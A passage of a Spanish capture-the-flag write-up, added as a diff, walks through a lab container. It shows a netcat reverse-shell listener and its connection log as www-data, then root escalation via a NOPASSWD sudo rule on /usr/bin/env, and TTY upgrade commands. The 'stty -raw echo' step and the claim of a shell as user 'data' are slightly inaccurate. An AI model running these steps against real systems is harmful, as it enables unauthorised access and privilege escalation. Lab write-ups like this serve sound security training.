Ma+++qoZNWpUsDw13HQNFBY7d+604dWrV68ThjJr1Khh9uzZY44dO2bDctGiRXa51lfo6XFq4Gi4cuLEiWb79u1m1apVplmzZkFdWPfu3e1+1MvUfmvXrm2XX3LJJWbQoEFm06ZNdii0Z8+ewTapr9WwYcP8a/GlPbaZM2eamjVrBnWVK1e2719169atM08//bS56667zP79+82RI0fs8o4dO9p1Czpm1U2aNMmeh7Vr15ply5YRbiUA4YaMZTvcfvOb35g//OGP5n/+5w/mJz/5iWnX7vGgXuH2y1/+yvTt288sXbrSbNiw2Qwf/oH53//9h5k2baYdymzevIU544wz8xvTraZPn1fMhRdeGGx/ySUVzF//+lczePC79vnIkQqLcvaxArNFi1Y28NasWW/mzfvSLh869H27vyVLVtjXu/rqquaBBx4K9pkN6YRbhQoVbKOux1qeGm4KAzXSGmq8+eab8/e71bRvf+KPw6N6bgWF29y5c81TTz1lH995551m37595l//+ldQL/Xq1TN79+614annCiUdhx6//vrrZsyYMfb51VdfbbZs2WLuvvtuWxd+rSuvvNIGozuOF1980cyePds+ls8//9wGvMJSAXX99dfb5VE9t4KOed68ecF5UgCvWbOGcCsBCDdkLNvh5npuW7bsyG/8PjZ//vOfzTPP9LTLFG61a9dJ2qZOnRvscvdcoaZw1EQUDWdqgsry5avzv6GvMuec80/TqVNnc8cdjey6rVvfZx59tJ19fO211e2+Z82aF+xLtCwcsP36vZnfMF6StE5xpRNuety0aVOzevVq2zCHw02NtHop5cuXD7ZTz2bKlCnBcyeTcKtbt64NBgWrW3fFihX2ONxzUZgeOHDAtGnTxoZPuE49KvXI3PPBgwfnfznpax+HX0v/DR+vwu7o0aP2tRWaCr6LLrooqHdSw62gY1Zd6nliWLJkINyQsVyFm9Ox45P539Sr2cdR4VauXPmgJ+ZolqVCSI811KjHGrrUUOPs2fPtsKPqLrjgQjNx4mT7eO7chaZBg9vMKaf80vbw1CPUcu3/b3/7myld+txAnTp1bV22pBtuMnr0aPPCCy8khVvz5s3tem4dUe9IjXp4mWQSbtrv4cOH7dBdWOPGjZO2l3bt2tk6BcuAAQPsRBUFncrKlSuTtndDk+HX6tevnw2w8Hqi/eg4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)
+
+Si vamos al directorio http://172.17.0.2/uploads/ vemos que nuestro archivo está subido y solo tendremos que hacer click sobre él y estar a la espera en nuestro equipo con netcat en puerto que habíamos indicado en el script.
+
+```bash
+nc -lvnp 4443
+```
+
+Y obtendremos la reverse shell directamente como el usuario data.
+```bash
+❯ nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59230
+Linux ebd3a0fc70ea 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 x86_64 x86_64 GNU/Linux
+ 12:14:20 up 42 min,  0 users,  load average: 0.06, 0.11, 0.25
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$  
+```
+
+Ahora comprobamos empezamos la escalada de privilegios viendo si hay algún archivo con permisos sudo que podamos utilizar siendo el usuario www-data.
+
+```bash
+sudo -l
+```
+
+```bash
+$ sudo -l
+Matching Defaults entries for www-data on ebd3a0fc70ea:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User www-data may run the following commands on ebd3a0fc70ea:
+    (root) NOPASSWD: /usr/bin/env
+$ 
+```
+
+Vemos que podemos utilizar el binario /usr/bin/env y para ello podemos ir a [GTFOBins](https://gtfobins.github.io/)y ver como explotar ese binario como muchos otros. En este caso simplemento tenemos que poner el siguiente comando.
+
+```bash
+sudo /usr/bin/env /bin/bash
+```
+
+Y con ello ya obtenemos una bash como root.
+```bash
+$ sudo /usr/bin/env /bin/bash
+whoami
+root
+```
+
+Para más comodidad podemos hacer un tratamiento de la tty.
+
+```bash
+script /dev/null -c bash
+```
+
+-- Hacemos Ctrl + c --
+
+```bash
+stty -raw echo; fg
+```
+
+```bash
+reset xterm
+```
+
+```bash
+export TERM=xterm
+```
+
+```bash
+export SHELL=bash
+```
+
+```bash
+root@ebd3a0fc70ea:/# whoami
+whoami
+root
+root@ebd3a0fc70ea:/# 
+```
